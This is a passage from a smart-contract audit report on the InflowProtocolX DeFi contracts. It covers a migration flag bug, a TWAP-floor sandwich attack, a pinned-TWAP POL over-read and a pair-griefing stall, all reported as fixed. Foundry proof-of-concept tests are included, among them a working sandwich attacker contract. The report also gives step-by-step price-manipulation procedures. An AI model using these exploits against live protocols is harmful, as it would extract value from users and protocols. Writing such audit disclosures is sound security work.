When the vault is migrated, the new `ExpansionModule` copies these flags from the old one by slot, at construction and again during the handoff, so a migration does not lose progress. The migration playbook also lets the operator change a rail on the new module: "If a rail is deliberately being changed, call `newExpansion.setRailAddress(idx, addr)` ... now, before `lockRails()`" (Phase 1.6). `setRailAddress()` changes the slot's token but not its flag, so a new token placed in an active slot is treated as already open:

1. `checkExpansion()` never runs its first seed, and nothing else creates its IPX/rail pool.
2. `seedTarget()` never reserves stable for its seed.
3. `contributeToRail()` returns 0 for it because its pool does not exist, so its share of each deployment stays in the vault.

If the replaced rail is the newest active one, the next rail's $25,000 check reads a pool that does not exist and fails on every cycle. The playbook's own check after the migration, `newExpansion.activeStage() == oldExpansion.activeStage()`, still passes.

The active flags belong to slots, not to the rail tokens that earned them, and changing a slot's token keeps its flag.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `setRailAddress()` (L272-L282)
- `_mergeActivationFrom()` (L464-L470)
- `checkExpansion()` (L331-L386)
- `seedTarget()` (L439-L446)
- `contributeToRail()` (L525-L629)

File: [docs/MIGRATION_PLAYBOOK.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/docs/MIGRATION_PLAYBOOK.md)

- Phase 1.6, Successor `ExpansionModule` (L237)

## Impact

After a migration that replaces the newest active rail, the next rail and every stage after it stay closed, and the replaced rail never gets a pool, so its share of every deployment (20% of the stable budget at stage 1) is never placed. In the PoC, the new module has $255,627 of B, above the $75,000 PLSX step, and a funded $10,002.50 seed bucket, yet it spends nothing and PLSX stays closed, while the old module opens PLSX from the same state. Later migrations cannot clear the flag, because they merge flags one way. Recovery needs someone to create the new rail's pool by hand, or another 30-day migration that puts the original rail back.

## Proof of Concept

The test opens PRVX and builds enough liquidity for PLSX to open (the control). It then follows the migration playbook: it deploys a new set of contracts, replaces PRVX in slot 0 with a new token, PRVX2, before `lockRails()`, and executes the 30-day migration. Finally, it calls `checkExpansion()` and `contributeToRail()` the way the vault and the liquidity deployer do.

Add the test below as `test/audit/issues/L-07.t.sol` and run:

```bash
forge test --match-path test/audit/issues/L-07.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {VaultController} from "../../../src/VaultController.sol";
import {ConversionModule} from "../../../src/ConversionModule.sol";
import {LiquidityDeployer} from "../../../src/LiquidityDeployer.sol";
import {ExpansionModule} from "../../../src/ExpansionModule.sol";
import {TreasuryController} from "../../../src/TreasuryController.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {console2} from "forge-std/console2.sol";

contract Issue_L04 is InflowFixture {
    function test_changedActiveRailStallsProgression() public {
        _seedExpansionPools();
        _topUpVault(0, 50_000e6);
        _sellIpxForWpls(alice, 100e18);
        assertTrue(expansion.prvxActive(), "PRVX did not open");
        deal(address(ipx), reserveWallet, 1_000_000_000e18);
        _matureRailPairAndBoostPol(address(prvx));
        uint256 snap = vm.snapshotState();
        _checkExpansionAsVault();
        assertTrue(expansion.core1Active(), "control: live cluster opens PLSX");
        vm.revertToState(snap);

        MockERC20 prvx2 = new MockERC20("PRVX v2", "PRVX2", 18);
        _seedRailPair(prvx2, 500_000_000e18, 5_000_000e18);
        vm.startPrank(owner);
        VaultController vc2 = new VaultController(
            address(ipx), address(wpls), address(usdc), address(factory), InflowConstants.IPX_VAULT_FLOOR, LAUNCH_WPLS_STABLE_Q
        );
        TreasuryController tc2 =
            new TreasuryController(address(vc2), treasuryWallet, InflowConstants.MIN_TREASURY_WALLET_TIMELOCK, address(treasury));
        ConversionModule conv2 = new ConversionModule(address(vc2), address(router), address(ipx), address(wpls), address(usdc));
        LiquidityDeployer dep2 = new LiquidityDeployer(
            address(vc2), address(router), address(ipx), address(wpls), address(usdc), address(tc2), address(lpLocker)
        );
        ExpansionModule exp2 = new ExpansionModule(
            address(vc2), address(router), address(factory), address(ipx), address(wpls), address(usdc),
            address(prvx), address(plsx), address(inc), address(pHex), address(lpLocker), address(expansion)
        );
        exp2.setRailAddress(0, address(prvx2));
        vc2.setModules(address(conv2), address(dep2), address(tc2), address(exp2), address(arb));
        vc2.setPairs(ipxWplsPair, wplsUsdcPair, ipxUsdcPair);
        dep2.setReserveWallet(reserveWallet);
        exp2.setReserveWallet(reserveWallet);
        vc2.setTWAPOracle(address(twapOracle));
        exp2.setTWAPOracle(address(twapOracle));
        vc2.lockPairs();
        exp2.lockRails();
        vc2.lockModules();

        ipx.queueVaultControllerMigration(address(vc2));
        vm.warp(ipx.pendingVCEta());
        ipx.executeVaultControllerMigration();
        twapOracle.setVaultController(address(vc2));
        vm.stopPrank();
        vm.prank(reserveWallet);
        ipx.approve(address(exp2), type(uint256).max);
        twapOracle.update(wplsUsdcPair);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        _updateRoutePairTwaps();

        assertTrue(exp2.prvxActive(), "replacement rail is marked active");
        assertEq(exp2.activeStage(), expansion.activeStage(), "playbook stage check");
        assertEq(factory.getPair(address(ipx), address(prvx2)), address(0), "IPX/PRVX2 pair exists");

        uint256 b = vc2.getB();
        uint256 seed = vc2.seedWithdrawable();
        vm.prank(address(vc2));
        uint256 spent = exp2.checkExpansion(b, 0);
        vm.prank(address(dep2));
        uint256 contributed = exp2.contributeToRail(address(prvx2), 5_000e6, 0);
        console2.log("successor B (USD 6dp)      :", b);
        console2.log("seed withdrawable          :", seed);
        console2.log("seedTarget (PLSX + INC)    :", exp2.seedTarget());
        console2.log("checkExpansion spent       :", spent);
        console2.log("contributeToRail(PRVX2)    :", contributed);
        assertGe(b, InflowConstants.PLSX_POL_B_USD, "B under the PLSX step");
        assertGe(seed, InflowConstants.railSeedUsd(1), "PLSX seed not funded");
        assertEq(exp2.seedTarget(), InflowConstants.railSeedUsd(1) + InflowConstants.railSeedUsd(2), "PRVX2 seed reserved");
        assertEq(spent, 0, "a seed ran");
        assertEq(contributed, 0, "PRVX2 was funded");
        assertEq(factory.getPair(address(ipx), address(prvx2)), address(0), "IPX/PRVX2 pair created");
        assertFalse(exp2.core1Active(), "PLSX opened");
    }
}
```

## Recommendation

Make `setRailAddress()` refuse a slot that is already active, or let `checkExpansion()` run the first seed for an active slot whose IPX/rail pool does not exist yet, with `seedTarget()` reserving that seed. Either way, a replacement rail then gets its pool and its first liquidity.

## Team Response

Fixed.

# [L-05] Permissionless Cycle Triggers Allow Rail Purchases at an Attacker-Selected Price Within the Slippage Tolerance

## Severity

Low Risk

## Description

Whoever triggers a cycle can choose the price at which the protocol buys rail tokens, anywhere down to just above the bottom of its slippage tolerance. On a targeted rail seed or rail slice, the vault therefore overpays by close to `lpSlippageBps` (about 2.9-3.0% at the 3% default; at higher owner settings, the 5% TWAP band on each pushed hop binds first). The attacker profits only when the purchase is at least about 0.3% of the pushed pool's input reserve; on smaller purchases, the push costs the attacker more than the protocol loses.

The expansion module derives the expected rail output (`expected`) from a completed TWAP and the trade's own AMM impact (`_twapHopOut()`). However, the router may execute the rail purchase up to `lpSlippageBps` below that expected output (`_minRailOut()`). At the default 300 bps setting, a rail purchase can execute at approximately 97% of its TWAP-derived value. Apart from that floor, the live reserves face only two constraints: each hop's spot output must stay within 5% (`TWAP_EXPANSION_MAX_DEVIATION_BPS`) of its TWAP output, and each hop's input must stay under 2% of its input reserve.

A plain taxed IPX sell runs a cycle; a router hop through IPX does not. Before triggering the cycle, an attacker can buy rail tokens through a stable/rail or WPLS/rail route pool, which contains no IPX. This worsens the route's live execution price without paying IPX tax or triggering the cycle. The attacker sizes the push so that the route stays within the 5% TWAP-deviation limit and its live output stays just above the 3% minimum-output floor. When spot starts at the TWAP, that is a buy of about 1.5% of the pushed pool's input reserve.

The attacker then sends a small taxed IPX sell to a flagged pair. `IPXToken._update()` collects the tax and calls `VaultController.checkAndExecute()` before the transferred IPX reaches the pair. `_runCycle()` calls `ExpansionModule.checkExpansion()` in STEP 4, before the convert threshold, the cooldown and the momentum gate are consulted. The seed path then picks the route the attacker pushed: routes are ranked by TWAP output, and the push does not lower it. Route selection (`_clearsFloor()`) and router execution (`_swapStableForToken()`) use the same discounted floor, so the purchase passes both checks and executes against the pushed reserves. The attacker then sells the rail back into the route after the protocol purchase.

Nothing else on the path sees the push. The VaultController's 20% guard checks only the WPLS/stable anchor. The anchor `refQ` correction is read after the push (`ExpansionModule.sol:338`). The IPX/rail band in `_twapPriceOkForExistingPair()` checks a pool the attacker does not touch. After the swap, nothing compares the rail received with its TWAP value; the router's `minOut` is the only such check.

This affects both first-time seeds and recurring rail contributions. First-time seeds call `_swapStableForToken()` through `_try()`. Recurring contributions call the same helper through `contributeToRail()`, after `LiquidityDeployer.deploy()` allocates a rail slice on a cycle that converts and deploys.

The behaviour contradicts the module's own NatSpec for `twapOracle` (`ExpansionModule.sol:62-67`): "there is no live-reserve fallback, so a same-block move on any pool cannot set the price the module fills at". The trigger cannot move the TWAP-derived floor, but it can move the fill down to it.

The attack requires an eligible seed or contribution and a fresh completed TWAP window on each route pool. The route must be liquid enough to keep the purchase within the 2% hop cap, and its spot must sit inside the 5% band. Expansion must be enabled, with the reserve wallet covering the planned IPX leg, and `lpSlippageBps` must be non-zero.

It pays only when the pushed hop's input is at least about 0.3% of that pool's input reserve. For a $5K seed, the pool's input side must therefore hold between about $250K (the hop cap) and $1.7M. For a first seed, the attacker's cycle must also be the first one that can seed the rail, because an honest cycle that gets there first seeds at the honest price. `TWAPOracle.update()` is permissionless, so the attacker can complete a due route window inside the attack transaction. No privileged role is required.

## Location of Affected Code

`src/ExpansionModule.sol:1143-1149` checks the live route against a floor that is already discounted from the TWAP-derived output:

File: [src/ExpansionModule.sol#L1143-L1149](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L1143-L1149)

```solidity
function _clearsFloor(uint256 amountIn, address[] memory path, uint256 expected)
    internal
    view
    returns (bool)
{
    return _spotRouteOut(amountIn, path) >= _minRailOut(expected);
}
```

`src/ExpansionModule.sol:1251-1265` passes that same discounted floor to the router, which fills on live reserves:

File: [src/ExpansionModule.sol#L1251-L1265](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L1251-L1265)

```solidity
uint256 expected = plan.expectedRail;
address[] memory path = plan.path;
address tokenOut = path[path.length - 1];
if (expected == 0) return 0;

uint256 minOut = _minRailOut(expected);

IERC20(stable).forceApprove(router, amountIn);

uint256 balBefore = IERC20(tokenOut).balanceOf(address(this));
// No expiring deadline; minOut is the real protection.
IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    amountIn, minOut, path, address(this), type(uint256).max
);
return IERC20(tokenOut).balanceOf(address(this)) - balBefore;
```

The floor is the full slippage tolerance below the TWAP-derived output:

File: [src/ExpansionModule.sol#L1271-L1273](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L1271-L1273)

```solidity
function _minRailOut(uint256 expected) internal view returns (uint256) {
    return (expected * (InflowConstants.BPS_DENOMINATOR - lpSlippageBps)) / InflowConstants.BPS_DENOMINATOR;
}
```

The guarantee this contradicts:

File: [src/ExpansionModule.sol#L62-L67](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L62-L67)

```solidity
/// @notice TWAP oracle every rail seed prices through: the swap
///         route's minimum output, the fair IPX reference for the
///         reserve leg, and the value of the rail tokens received.
///         Unset or unmatured, the seed path skips; there is no
///         live-reserve fallback, so a same-block move on any pool
///         cannot set the price the module fills at.
```

The permissionless trigger is at `src/IPXToken.sol:438-445`. The cycle invokes expansion at `src/VaultController.sol:444-456`, before the cooldown and momentum gate at `src/VaultController.sol:529`. The shared seed and contribution paths are at `src/ExpansionModule.sol:639-709` and `src/ExpansionModule.sol:525-567`, respectively.

## Impact

On every purchase the attacker targets, the protocol receives close to `lpSlippageBps` less rail than the TWAP-and-own-impact price. At the default 3% setting, a $5,000 first seed loses about $146-150 of value (2.9-3.0%). Across the four rail seeds ($20,002.50 in total), that is at most about $600, and only if every rail's route pool sits in the profitable depth window and the attacker wins the first eligible cycle for each rail. Only the stable overpayment is lost: a first seed scales its IPX leg to the rail actually received (`_ipxLegForRail()`, `ExpansionModule.sol:1082`), so reserve IPX is not over-committed, and the rail still opens or receives liquidity. The same extraction is possible against recurring rail slices on deploying cycles, but only when a slice is at least about 0.3% of the pushed pool's input reserve (about $735 on a $250K pool), so recurring extraction needs large slices or thin route pools.

The attacker's result for one pushed hop is shown below. It assumes a constant-product pool whose spot starts at its TWAP, the 0.29% fee (`AMM_FEE_NUM = 9971`), `lpSlippageBps` = 3%, and a push that lands exactly on the floor. That push is 1.54% of the input reserve at every size, because both the fill and `expected` are computed on the post-push reserve:

| Hop input (share of input reserve) | Attacker PnL (share of protocol notional) | Protocol loss (vs. the honest fill) |
| ---------------------------------- | ----------------------------------------- | ----------------------------------- |
| 0.1%                               | -5.78%                                    | 3.00%                               |
| 0.2%                               | -1.40%                                    | 3.00%                               |
| 0.3%                               | +0.07%                                    | 3.00%                               |
| 0.5%                               | +1.24%                                    | 2.99%                               |
| 1%                                 | +2.12%                                    | 2.99%                               |
| 2%                                 | +2.57%                                    | 2.97%                               |

The attack is atomic, permissionless and riskless: the attacker can revert if the seed does not execute. It needs no mempool or block-ordering access, because the trigger sets the pre-swap state inside its own transaction. Every targeted purchase therefore loses close to the full tolerance (about 2.9-3.0% at the default, since the push must stop just above the floor), which the NatSpec above says a same-block move cannot do. This is also an area the audit brief asks reviewers to check (`AUDIT_BRIEF.md:237-240`: MEV and sandwich considerations at the seed moment, slippage bounds).

The severity is Low: the loss is capped by the TWAP-anchored `lpSlippageBps` tolerance the protocol configured (about $150 per $5,000 seed) and leaves rail opening and progression intact. The attack is permissionless and riskless, but it pays only when the targeted hop is about 0.3%-2% of the pushed pool's input reserve and, for a seed, only if the attacker wins the race to run the first cycle that can seed that rail.

## Proof of Concept

Save as `test/audit/issues/M-04.t.sol`. It extends the repository's own `InflowFixture` and mocks.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {IPXToken} from "../../../src/IPXToken.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {MockUniswapV2Router} from "../../mocks/MockUniswapV2Router.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Holds ordinary WPLS and IPX. It has no privileged protocol role.
///         The WPLS/PRVX pair is not an IPX pair, so its swaps cannot trigger
///         the cycle. A later 200-wei IPX sell triggers the seed in the state
///         this contract has chosen.
contract RailSeedSandwicher {
    IPXToken private immutable ipx;
    MockERC20 private immutable wpls;
    MockERC20 private immutable prvx;
    address private immutable triggerPair;
    MockUniswapV2Router private immutable router;

    constructor(IPXToken _ipx, MockERC20 _wpls, MockERC20 _prvx, address _triggerPair, MockUniswapV2Router _router) {
        ipx = _ipx;
        wpls = _wpls;
        prvx = _prvx;
        triggerPair = _triggerPair;
        router = _router;
    }

    function attack(uint256 wplsIn, uint256 triggerSell) external {
        _swap(address(wpls), address(prvx), wplsIn);

        // This taxed sell invokes VaultController.checkAndExecute() before
        // its IPX reaches the base pair. The expanded seed then buys PRVX
        // from the already-pushed WPLS/PRVX pair.
        ipx.transfer(triggerPair, triggerSell);

        _swap(address(prvx), address(wpls), prvx.balanceOf(address(this)));
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) private {
        IERC20(tokenIn).approve(address(router), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), type(uint256).max);
    }
}

/// @notice A pre-existing, $1m WPLS-side PRVX route has a completed TWAP.
///         The attacker neither creates nor funds the route in the attack
///         transaction and never touches IPX/WPLS. They push the live route
///         just inside the floor, trigger the seed, then unwind for profit.
contract Issue_M04 is InflowFixture {
    RailSeedSandwicher internal attacker;
    address internal routePair;

    // 1.5% of the WPLS-side reserve leaves the eventual seed fill about
    // 2.92% below the honest fill, but still narrowly above its 3%
    // TWAP-derived floor. 15,500 WPLS would be just below it and is
    // correctly refused by RouteBelowFloorSkipped.
    uint256 internal constant ATTACK_WPLS_IN = 15_000e18;
    uint256 internal constant TRIGGER_SELL = 200;

    function setUp() public override {
        super.setUp();

        // A legitimate pre-existing WPLS/PRVX market. A $5k seed is 0.5%
        // of its WPLS reserve, inside the protocol's 2% hop cap.
        _seedRailPair(prvx, 100_000_000e18, 1_000_000e18);
        _prepareLockedPolB(60_000e6);
        _fundSeedBucket(InflowConstants.railSeedUsd(0));
        routePair = factory.getPair(address(wpls), address(prvx));

        attacker = new RailSeedSandwicher(ipx, wpls, prvx, ipxUsdcPair, router);
        wpls.mint(address(attacker), 20_000e18);
        vm.prank(alice);
        ipx.transfer(address(attacker), TRIGGER_SELL);
    }

    function test_cycleTriggerBuysAtAttackerChosenFloor() public {
        assertEq(factory.getPair(address(ipx), address(prvx)), address(0), "IPX/PRVX exists before seed");
        assertGt(IERC20(routePair).totalSupply(), 0, "route is not pre-existing");
        assertGt(wpls.balanceOf(routePair), 500_000e18, "route is not independently deep");

        // Honest control: the same public trigger seeds against the unchanged route.
        uint256 snapshot = vm.snapshotState();
        vm.prank(bob);
        ipx.transfer(ipxUsdcPair, TRIGGER_SELL);
        address controlPair = factory.getPair(address(ipx), address(prvx));
        uint256 honestPrvxInSeed = prvx.balanceOf(controlPair);
        assertTrue(expansion.prvxActive(), "control did not seed PRVX");
        vm.revertToState(snapshot);

        uint256 attackerWplsBefore = wpls.balanceOf(address(attacker));
        attacker.attack(ATTACK_WPLS_IN, TRIGGER_SELL);

        address attackedPair = factory.getPair(address(ipx), address(prvx));
        uint256 attackedPrvxInSeed = prvx.balanceOf(attackedPair);

        assertTrue(expansion.prvxActive(), "attacked cycle did not seed PRVX");
        assertLt(
            attackedPrvxInSeed,
            (honestPrvxInSeed * 972) / 1000,
            "seed did not buy at least 2.8% fewer PRVX than the identical honest seed"
        );
        assertGt(
            wpls.balanceOf(address(attacker)),
            attackerWplsBefore,
            "attacker could not profit after unwinding the route push"
        );
    }
}
```

The setup creates a deep, pre-existing WPLS/PRVX market (100M PRVX against 1M WPLS, so the $5K seed is 0.5% of the WPLS reserve and inside the 2% hop cap) and no IPX/PRVX pair. An honest control runs the same 200-wei trigger sell against the untouched route and records how much PRVX the seed buys. The attack then reverts to the same state; an unprivileged contract pushes the route pool with 15,000 WPLS (1.5% of its WPLS reserve), sends the 200-wei taxed sell that runs the cycle and seeds PRVX at the pushed price, and unwinds the push.

Run:

```text
forge test --match-path test/audit/issues/M-04.t.sol -vv
```

Observed: 1 passed, 0 failed, 0 skipped.

```text
Ran 1 test for test/audit/issues/M-04.t.sol:Issue_M04
[PASS] test_cycleTriggerBuysAtAttackerChosenFloor() (gas: 6370551)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The test asserts that the attacked seed buys at least 2.8% fewer PRVX than the identical honest seed (the push leaves the fill about 2.92% below the honest fill, just above the 3% TWAP-derived floor; a 15,500 WPLS push is refused with `RouteBelowFloorSkipped`), and that the attacker ends with more WPLS than it started with after unwinding.

## Recommendation

Do not let a public AMM rail purchase execute below its planned TWAP-and-own-impact output, except for a documented, deterministic rounding allowance. For example:

```solidity
function _minRailOut(uint256 expected) internal pure returns (uint256) {
    return expected - 1;
}
```

`_clearsFloor()` already runs inside `_planSeed()` before `withdrawTo()`. Applying the committed floor there means an unfavourable route is skipped before any protected seed or surplus stable leaves the vault. The same rule must apply to both `_try()` and `contributeToRail()`, because both use `_planSeed()` and `_swapStableForToken()`.

The strict floor comes with three conditions. First, it removes the slack between the preflight and the router, so `_spotRouteOut()` must reproduce the router's fill exactly. It models every hop at the 0.29% `AMM_FEE_NUM`; a pair whose fee or rounding differs would pass `_clearsFloor()` and then revert at the router, rolling back the whole cycle on every attempt. Checking the floor against the router's own `getAmountsOut()` for the chosen path, or keeping an allowance wider than one wei, removes that risk. Second, `lpSlippageBps` keeps its other role as the `addLiquidity()` minimum in `_addRailLiquidity()` and `contributeToRail()`. The lower bound I-16 proposes for it then concerns those minimums only, and the `lpSlippageBps` NatSpec (`ExpansionModule.sol:55-57`), the `RouteBelowFloorSkipped` NatSpec (`ExpansionModule.sol:148-158`) and the `setSlippage()` entry in `README.md:307` should stop describing it as the swap tolerance. Third, a route now clears only while its spot output is at or above its TWAP-and-own-impact output. This is the skip I-16 describes for a zero `lpSlippageBps`, now at every setting. A seed or contribution is deferred whenever spot sits on the wrong side of the window average, and for as long as a steady rise in the rail's price keeps spot ahead of the lagging TWAP. Nothing is lost, because a deferred seed retries on the next taxed sell and a skipped contribution stays in the vault, but contributions are what lift a rail's POL toward the $25K `RAIL_LP_MIN_USD` gate, so frequent skips slow progression. The per-trigger rail skip the README already accepts (`README.md:387-392`) also becomes cheaper: today the seller must push every route past its floor or band, while under a strict floor a small adverse move on every route is enough.

If those costs are too high, a small fixed tolerance, independent of `lpSlippageBps` and in the tens of basis points, keeps ordinary noise from skipping a route while bounding the extraction at roughly that tolerance instead of the full `lpSlippageBps`, because the protocol's loss on a targeted purchase tracks the tolerance it accepts. If availability during legitimate moves must be preserved without any tolerance, the protocol needs an execution mechanism that can honour the original limit, such as a competitive RFQ or solver auction. Moving execution to `poke()`, a keeper, or a later block does not on its own stop a public transaction from being bundled or sandwiched. Ranking routes by live spot output is also unsafe, because the attacker can manipulate the ranking.

Do not use the route pools' `blockTimestampLast` as a cheaper same-block filter. Anyone can set it to the current block with the pair's permissionless `sync()`, so the triggering seller could skip every seed and contribution of its round for the cost of gas, and ordinary trades on the shared WPLS/stable anchor in the same block would skip the WPLS route for honest cycles. It would also not stop a push held across a block.

Update the `twapOracle` NatSpec (`ExpansionModule.sol:62-67`) to say that a TWAP-derived minimum output does not fix the router's live execution price while a slippage tolerance remains.

## Team Response

Fixed.

# [L-06] Rail-Pair POL Is Valued Through the Rail Pair's Own Pinned TWAP, so a Held Skew Over-Reads B and the $25K Rail Gate

## Severity

Low Risk

## Description

A third party who holds a price skew of m in an IPX/rail pair for a full TWAP window can make the protocol read that pair's POL at about sqrt(m) times its pre-skew value. That is more than the skewed pool is actually worth, by a factor that approaches 2 as m grows. The over-read inflates B and the reading is checked against the $25K per-rail gate, and can open progression stages early.

`VaultController.polUsd()` values a rail pair at `2 * min(v_ipx, v_rail)`, where each leg is the pair's live reserve valued by `_tokenAmountUsd()`. For a rail token, `_tokenAmountUsd()` has no external price: it converts the rail amount to IPX with `oracle.consult(ipxRailPair, token, amount)`, the pinned TWAP of the very pool whose reserves `polUsd()` is valuing. Pinning that TWAP is permissionless (`TWAPOracle.update()`).

Suppose a sale moves the pool from reserves (I, R) to (sqrt(m)·I, R/sqrt(m)) and the skew is held for the whole span up to the next pin, which is at least one window. The pinned TWAP then prices rail at m times its honest IPX value. Both legs read sqrt(m) times their honest value, while the pool's market value is only ((sqrt(m) + 1/sqrt(m)) / 2) times honest. The reading therefore exceeds the market value by a factor of 2m/(m + 1), which stays below 2. Moving (I, R) to (2I, R/2), for example, makes `polUsd()` report 2V against a market value of 1.25V, where V is the honest pool value: a 60% over-read.

The `polUsd()` NatSpec (`VaultController.sol:1282-1297`) says that `min` "caps a pinned-TWAP attack at the real IPX value in the pool, never over-reads under a reserve skew in either direction". The cap does hold: the reading is at most twice the value of the IPX the pool really holds. But the skew itself raises that IPX (at m = 4, half of the pool's IPX came in with the attacker's sale), and at market prices the rail leg it is paired with is worth only 1/m of it.

The inflated figure feeds B (`_calculateB()`), the newest-rail POL check `ExpansionModule._railPolAtLeast()`, the rail-ladder gate in `checkExpansion()` (`ExpansionModule.sol:349-352`) and the treasury gate (`ExpansionModule.sol:377-385`). It matters when the newest rail's protocol POL sits just under `RAIL_LP_MIN_USD` ($25K) while B already clears the next step, or when B sits just under a step:

1. Sell IPX into the IPX/rail pair (or donate it and `sync()`) until its price is m times the honest ratio. Hold it there from one pin to the next (at least one window, 1-4h), re-pushing after arbitrage fills. A constant hold is sufficient but not necessary: the pinned TWAP is a time average, so a shorter, larger skew with the same average gives the same reading, provided the pool sits at that average when the cycle reads it; larger skews, however, face harder arbitrage.
2. Pin the window with `TWAPOracle.update()`.
3. While the skew is still held, trigger a cycle with any taxed sell. `_railPolAtLeast()` and B read the pair at about sqrt(m) times its honest value (more after a donation). The next rail's gate then passes, and the rail seeds if its seed and route checks also pass; at the last step, the treasury activates instead.
4. Unwind.

## Location of Affected Code

The rail leg is priced through the IPX/rail pair's own pinned TWAP:

File: [src/VaultController.sol#L1383-L1394](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1383-L1394)

```solidity
// Rail token: rail -> IPX via IPX/rail TWAP, then IPX -> USD.
address ipxRailPair = IUniswapV2Factory(factory).getPair(ipxToken, token);
if (ipxRailPair == address(0)) return 0;
if (!oracle.hasCompletedWindow(ipxRailPair)) return 0;

uint256 ipxOut;
try oracle.consult(ipxRailPair, token, amount) returns (uint256 out) {
    ipxOut = out;
} catch {
    return 0;
}
return _ipxToUsd(oracle, ipxOut);
```

Rail pairs are valued at `2 * min(v0, v1)`:

File: [src/VaultController.sol#L1318-L1322](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1318-L1322)

```solidity
bool basePair = t0 == wpls || t1 == wpls || t0 == stable || t1 == stable;
if (!basePair) {
    // mulDiv floors, so the result can never round up.
    return Math.mulDiv(lpBal, 2 * Math.min(v0, v1), ts);
}
```

The NatSpec claim the skew contradicts:

File: [src/VaultController.sol#L1292-L1295](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1292-L1295)

```solidity
///         fees plus tax. min caps a pinned-TWAP attack at the real
///         IPX value in the pool, never over-reads under a reserve
///         skew in either direction, and satisfies
///         2 * min(a, b) <= 2 * sqrt(a * b), so B can only fall
```

Anyone can pin the window:

File: [src/TWAPOracle.sol#L327](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TWAPOracle.sol#L327)

```solidity
function update(address pair) external {
```

## Impact

Stages open earlier than the README's rule allows (each stage "requires the previous rail's own pool to hold at least `RAIL_LP_MIN_USD` ($25K) of locked POL", `README.md:199-201`). The next rail is seeded early from the protected seed reserved for it, and that LP is locked as POL, so the seed is used for its intended purpose rather than lost; floors and thresholds step up, and, at the last step, the 4% treasury slice starts. Activation flags are one-way, so the stage stays open after the skew is unwound. Nothing is stolen, and the attacker makes no profit. The over-read is bounded and costly: it stays below twice the pool's actual value, and the skew must be held against arbitrage for a full window. Each push to (2I, R/2) that arbitrage reverses costs the attacker about a quarter of the pool's value. In practice, only a small skew near a gate is realistic: lifting a rail worth $24K over the $25K gate takes a held skew of about 8.5%. This is Low: the impact is a one-way progression step firing early, with no loss and no profit to the attacker, and while the path is permissionless and the "B clear, prior rail just under $25K" state recurs at every rail step, it needs the pool within a small skew of the gate and the skew held across a full window against arbitrage.

## Recommendation

Price the rail leg from a reference the IPX/rail pair does not control, such as the WPLS/rail or stable/rail route TWAP that `ExpansionModule._railToIpxTwap()` already uses. With both legs priced outside the pair, `2 * min(v_ipx, v_rail)` stays at or below `2 * sqrt(v_ipx * v_rail)`, which no swap on the pair can raise, so a held skew can only lower the reading. The reference pool must be one a third party cannot create or own cheaply. The seed path registers every route pool it quotes with the oracle (`ExpansionModule._twapHopOut()`), and `railTwapPairs()` has the cycle pin it, so a thin stable/rail pool created for a rail that has none becomes a tracked, pinned TWAP. Routing ranks such a pool out with the 2% hop cap (`EXPANSION_HOP_CAP_BPS`), but a valuation has no such gate. Accept a route pool as the reference only above a depth bar well beyond the position being valued, and take the lower reading when both routes qualify. A rail whose route pools all fall below the bar then reads at zero and holds the next stage, which fails closed.

Alternatively, require the pair's spot and TWAP to sit within a band of that reference before its POL counts. This bounds the over-read rather than removing it: a skew held just inside a band b still reads about b/2 high, about 2.4% at the 5% band the seed path uses, which can still lift a rail sitting just under the $25K gate. A pair pushed outside the band reads zero, which only delays the gate, and the reference needs the same depth bar.

Correct the NatSpec at `VaultController.sol:1292-1294`.

## Team Response

Fixed.

# [L-07] A Third Party Can Shape the IPX/Rail Pair so the Rail Is Skipped Every Cycle (Progression Stall)

## Severity

Low Risk

## Description

Anyone can put a not-yet-seeded IPX/rail pair into a state that the protocol cannot seed and cannot repair by itself. That rail is then skipped on every cycle and, because the ladder is sequential, every later rail and the treasury stage wait behind it until a third party repairs the pair.

`ExpansionModule._try()` seeds rail _i_ only when its IPX/rail pair is in one of three states: empty; holding only dust, at most 1% (`DUSTED_PAIR_MAX_BPS`) of each planned leg, checked by `_dustWithinBound()`; or live, with a ratio no more than twice the fair leg and spot within 5% of the route's TWAP chain, checked by `_livePairOk()` and `_twapPriceOkForExistingPair()`. In any other state, `_try()` returns 0 with nothing moved, and no protocol path moves the pair back into a seedable state.

